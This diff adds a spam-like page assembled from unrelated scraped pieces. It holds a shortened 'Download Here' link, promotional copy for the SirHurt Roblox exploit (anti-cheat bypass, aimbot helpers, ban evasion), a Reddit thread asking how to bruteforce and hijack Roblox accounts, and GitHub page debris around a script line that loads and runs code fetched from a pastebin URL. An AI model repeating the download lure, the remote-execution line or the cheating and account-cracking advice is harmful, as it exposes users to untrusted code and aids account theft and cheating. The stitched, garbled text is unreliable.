@@ -1,0 +1,176 @@
+Download Here ---> https://tinyurl.com/ycx3x5fn?id=6697200
+
+
+
+SirHurt V4
+
+
+Originally started in 2015 as a private project that became public, SirHurt is now completely rewritten with a fresh outlook for 2023 and beyond. We are dedicated to consistently providing the best user experience while maintaining integrity and offering a product that always goes above and beyond. Asshurt/SirHurt started as a advanced roblox exploit/roblox cheat into a full script executor. We not only provide cheap roblox exploits for both Android and Windows devices, but we are also a digital-games marketplace, providing very cheap robux at very low prices!
+
+
+Features
+
+
+Tainted Bypass
+
+
+We have always been dedicated to the security of our users. There has never been a recorded case of our software being detected by ROBLOX in our 5 year history.
+
+
+Full LUA Execution
+
+
+SirHurt gives you the ability to execute scripts at will. If ROBLOX can run it, so can SirHurt.
+
+
+Friendly API
+
+
+SirHurt strives to be api friendly. We do our best to add all aliases used for specific functions on different software to put SirHurt in a better position to be supportive of running code written on other software.
+
+
+Debug Library
+
+
+SirHurt contains a debug library to allow a wider range of scripts requiring this special library to function.
+
+
+XPROTECT
+
+
+Ever had that one annoying person who stole your code? XPROTECT allows you to protect your code from unwanted eyes while providing additional checks to detect common methods of reversing such as hooking and metatable overrides.
+
+
+You Make The Rules
+
+
+SirHurt allows you to execute your own custom lua code within the game world.
+
+
+GUI Protection
+
+
+SirHurt provides you with a neat little function called get_hidden_gui(). This will create our own unique PlayerGui which is hidden from game scripts keeping your GUI's hidden from snoopy anti cheats.
+
+
+Safety
+
+
+We aim to provide all our users with the leading anti-anti cheating techniques currently available. If a hurdle is encountered, we will find a solution.
+
+
+Mouse Functions
+
+
+SirHurt provides you with mouse / keyboard functions which simulate mouse clicks or key presses inside the game. This makes it easy to write your own aimbots.
+
+
+Hookfunction
+
+
+SirHurt provides you with a neat function called hookfunction(). Hookfunction allows you to hook functions within the game to run your desired code.
+
+
+Easy Setup
+
+
+We pride ourselves on keeping our system simple to use and setup. SirHurt is very easy to use, and provides step by step instructions in the download page for your convince. If you need any help, we have a support team ready to assist you through the process in our discord server.
+
+
+Drawing Library
+
+
+We pride ourselves on protecting our users. SirHurt allows you to create Drawing Objects which are completely undetectable by game scripts.
+
+
+ScriptHub
+
+
+SirHurt provides you with a script hub, which will feature a collection of pre-made scripts for those who aren't skilled in the field of coding.
+
+
+Trace Ban Protection
+
+
+SirHurt automatically removes any traces made by game scripts which anti cheats use to track you on other accounts to aid you in keeping your identity a secret.
+
+
+Script Tabs
+
+
+The SirHurt interface provides you with tabs, allowing you to have multiple scripts open at once allowing you to easily switch between scripts.
+
+
+How can i bruteforce roblox accounts?
+
+
+As the title suggests i would like to learn how to bruteforce roblox accounts. My reasoning is that i believe i can help people get their accounts back (and occasionally treat myself to people who have been inactive) if you know any discord servers/subreddits that tells you how to hack roblox/ any other kind of account really feel free to comment plox.
+
+
+The term "Bruteforce" literally means "Trying over and over until it works"
+
+
+I guess you might be able to make a bot that just tries a list of the most common passwords.
+
+
+well my bad, Cause i dont want a bot that takes 9 months to get a password. Im looking for something that will either allow me to almost instantly crack 2FA or something along that. If you have any sites about hacking any sort of account il take what i can get
+
+
+hi guys i want help with my account my accaunt will be hacked and i know who do this i want help with hack him who can help me go in private messages with me
+
+
+Your submission has been automatically removed due to your account not meeting the subreddit requirement of having more than 10 comment karma.
+
+
+I am a bot, and this action was performed automatically. Please contact the moderators of this subreddit if you have any questions or concerns.
+
+
+About Community
+
+
+Reddit's #1 ROBLOX Exploiting community. Whether it's scripts, tutorials, memes or anything else - we've got it!
+
+
+Reddit and its partners use cookies and similar technologies to provide you with a better experience. By accepting all cookies, you agree to our use of cookies to deliver and maintain our services and site, improve the quality of Reddit, personalize Reddit content and advertising, and measure the effectiveness of advertising. By rejecting non-essential cookies, Reddit may still use certain cookies to ensure the proper functionality of our platform. For more information, please see our Cookie Notice and our Privacy Policy .
+
+
+Name already in use
+
+
+A tag already exists with the provided branch name. Many Git commands accept both tag and branch names, so creating this branch may cause unexpected behavior. Are you sure you want to create this branch?
+
+
+ Roblox / FE_Scripts / Suicide.lua 
+
+
+This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.
+
+
+
+
+  
+Open with Desktop
+
+  
+View raw
+
+  
+Copy raw contents Copy raw contents Copy raw contents
+
+
+
+This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters. Learn more about bidirectional Unicode characters 
+
+
+ 
+  loadstring (game: HttpGet ( " https://pastebin.com/raw/RNWgaqCE " , true ))()   
+
+
+
+Footer
+
+
+You can’t perform that action at this time.
+
+
+You signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session.
